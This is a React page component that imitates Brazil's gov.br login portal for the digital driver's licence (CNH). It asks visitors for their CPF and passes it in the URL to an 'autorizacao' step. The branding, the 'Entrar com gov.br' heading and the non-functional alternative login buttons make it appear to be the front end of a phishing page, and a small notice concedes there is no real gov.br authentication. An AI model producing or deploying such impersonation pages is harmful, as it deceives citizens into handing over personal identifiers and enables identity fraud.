import { useState } from "react";
import { useLocation } from "wouter";
import { validarCPF } from "@/lib/utils";
import { GovBrFooter, GovBrHeader } from "./shared";

export default function CNHLanding() {
  const [, setLocation] = useLocation();
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState("");

  const handleContinue = () => {
    const digits = cpf.replace(/\D/g, "");
    if (!validarCPF(digits)) {
      setError("Informe um CPF válido para continuar.");
      return;
    }
    setError("");
    setLocation(`/autorizacao?cpf=${digits}`);
  };

  return (
    <div className="min-h-screen bg-slate-100 text-slate-900">
      <GovBrHeader />
      <main className="mx-auto grid min-h-[calc(100vh-129px)] max-w-6xl gap-6 px-4 py-6 sm:px-6 lg:grid-cols-[1.1fr,0.9fr] lg:px-8 lg:py-10">
        <section className="relative overflow-hidden rounded-[2rem] bg-[#0b2f6b] text-white shadow-2xl shadow-blue-950/25">
          <img src="/assets/govbr-conta.jpg" alt="Identidade gov.br" className="h-full w-full object-cover" />
          <div className="absolute inset-0 bg-gradient-to-t from-[#071D41] via-[#071D41]/35 to-transparent" />
          <div className="absolute inset-x-0 bottom-0 p-8 sm:p-10">
            <div className="mb-4 inline-flex rounded-full border border-white/20 bg-white/10 px-4 py-1 text-xs font-semibold uppercase tracking-[0.28em] text-blue-100">
              identidade gov.br
            </div>
            <h1 className="max-w-md text-3xl font-semibold leading-tight sm:text-4xl">Acesse sua Carteira Digital de Trânsito com a conta gov.br</h1>
            <p className="mt-4 max-w-lg text-sm leading-6 text-blue-100 sm:text-base">
              Faça a validação da sua CNH digital de forma segura, com consulta oficial e visual adaptado para o fluxo da carteira digital.
            </p>
          </div>
        </section>

        <section className="rounded-[2rem] border border-slate-200 bg-white p-6 shadow-xl shadow-slate-200/70 sm:p-8">
          <div className="mb-8">
            <p className="text-sm font-semibold uppercase tracking-[0.26em] text-[#1351b4]">Entrar com gov.br</p>
            <h2 className="mt-3 text-3xl font-semibold text-[#071D41]">Identifique-se para continuar</h2>
            <p className="mt-3 text-sm leading-6 text-slate-600">
              Informe o seu CPF para prosseguir para a autorização de acesso aos dados da Carteira Nacional de Habilitação.
            </p>
          </div>

          <div className="space-y-4">
            <label className="block text-sm font-semibold text-slate-700">CPF</label>
            <input
              value={cpf}
              inputMode="numeric"
              maxLength={14}
              onChange={(event) => {
                const digits = event.target.value.replace(/\D/g, "").slice(0, 11);
                const masked = digits
                  .replace(/(\d{3})(\d)/, "$1.$2")
                  .replace(/(\d{3})(\d)/, "$1.$2")
                  .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                setCpf(masked);
              }}
              placeholder="Digite seu CPF"
              className="h-14 w-full rounded-2xl border border-slate-300 px-4 text-lg outline-none transition focus:border-[#1351b4] focus:ring-4 focus:ring-blue-100"
            />
            {error ? <p className="text-sm font-medium text-red-600">{error}</p> : null}
            <button
              onClick={handleContinue}
              className="h-14 w-full rounded-2xl bg-[#1351b4] text-base font-semibold text-white shadow-lg shadow-blue-700/20 transition hover:bg-[#0f4aa3]"
            >
              Continuar
            </button>
          </div>

          <div className="mt-8 space-y-5 border-t border-slate-200 pt-8">
            <div>
              <p className="mb-3 text-xs font-semibold uppercase tracking-[0.22em] text-slate-500">Outras formas de acesso</p>
              <div className="grid gap-3 sm:grid-cols-2">
                {[
                  "Seu banco",
                  "Certificado digital",
                  "Internet banking",
                  "QR Code gov.br",
                ].map((option) => (
                  <button key={option} className="rounded-2xl border border-slate-200 px-4 py-3 text-left text-sm font-medium text-slate-700 transition hover:border-[#1351b4] hover:text-[#1351b4]">
                    {option}
                  </button>
                ))}
              </div>
            </div>

            <div className="rounded-2xl bg-slate-50 p-4 text-sm leading-6 text-slate-600">
              Ao prosseguir, você será direcionado para a etapa de autorização interna do serviço. Não há autenticação externa com o gov.br neste fluxo.
            </div>
          </div>
        </section>
      </main>
      <GovBrFooter />
    </div>
  );
}
